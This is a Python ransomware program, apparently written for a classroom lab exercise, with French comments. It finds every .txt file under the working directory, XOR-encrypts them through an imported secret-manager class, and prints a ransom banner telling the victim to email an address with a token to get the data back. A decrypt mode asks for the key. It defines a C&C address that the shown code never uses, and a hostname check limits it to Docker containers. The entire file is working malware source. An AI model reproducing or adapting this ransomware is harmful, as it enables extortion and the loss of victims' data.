import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        return sorted(str(file.resolve()) for file in Path('.').rglob(filter))
        #J'ai changé le / en . mais j'ai ajouté resolve pour trouver le chemin aboslue, cela sera plus rapide que parcourir tous les fichiers avec /
        #Je force les chemins absolues obtenues en chaine de caractère
        #le filtre (.txt) dans notre cas pourra être écris par l'utilisateur (car paramètre de la fonction) ce qui donne une fonction plus globale

    def encrypt(self):
        # main function for encrypting (see PDF)
        secret_manager = SecretManager() #je crée un objet secret manager
        secret_manager.setup() #utilisation de la fonction setup de ma classe 
        secret_manager.xorfiles(self.get_files(".txt")) #Liste les fichiers avec la fonction  get_files puis utilise xerfiles sur eux
        print(f"Bonjour :) Voici comment me contacter :D : {secret_manager.get_hex_token()}" ) #Je donne bien le token hashé en hexa à la victime

    def decrypt(self):
        # main function for decrypting (see PDF)
        secret_manager = SecretManager()
        secret_manager.load()  # Charge les éléments cryptographiques locaux
        files = self.get_files(".txt")
        while True:
            try:
                key = input("La cle s'il te plait : ")  
                secret_manager.set_key(key) #si faux ici alors exception
                secret_manager.xorfiles(files)  #on restaure 
                secret_manager.clean() #on netoie
                print(" C'est ça bien joué tu es libéré") 
                break  

            except Exception as e:
                print(f"Error: {e}")  
                print("Faux ! recomence") 
                continue 

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()